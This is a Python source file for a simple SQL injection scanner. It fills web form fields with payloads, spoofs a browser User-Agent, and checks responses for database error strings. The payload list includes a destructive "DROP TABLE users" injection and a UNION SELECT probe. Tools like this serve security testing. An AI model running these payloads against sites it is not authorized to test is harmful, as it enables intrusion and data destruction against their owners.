# src/sqli_detector.py
import requests

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
}

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users --",
    "' UNION SELECT null, version() --"
]

class SQLiDetector:
    def __init__(self, target_url, timeout=10, auth=None):
        self.target_url = target_url
        self.timeout = timeout
        self.auth = auth  # Tuple (username, password)

    def test_form(self, form):
        vulnerabilities = []
        for payload in SQLI_PAYLOADS:
            data = {}
            for input_field in form['inputs']:
                data[input_field['name']] = payload  # Inject payload
            
            try:
                if form['method'] == 'post':
                    response = requests.post(
                        form['action'],
                        data=data,
                        headers=HEADERS,
                        timeout=self.timeout,
                        auth=self.auth
                    )
                else:
                    response = requests.get(
                        form['action'],
                        params=data,
                        headers=HEADERS,
                        timeout=self.timeout,
                        auth=self.auth
                    )
                
                if self.is_vulnerable(response):
                    vulnerabilities.append({
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'].upper()
                    })
            except Exception as e:
                print(f"[!] Error testing {form['action']}: {e}")
        return vulnerabilities

    def is_vulnerable(self, response):
        errors = [
            "sql syntax", "mysql server", "postgresql", "ora-",
            "unclosed quotation", "syntax error", "sql command"
        ]
        return any(error in response.text.lower() for error in errors)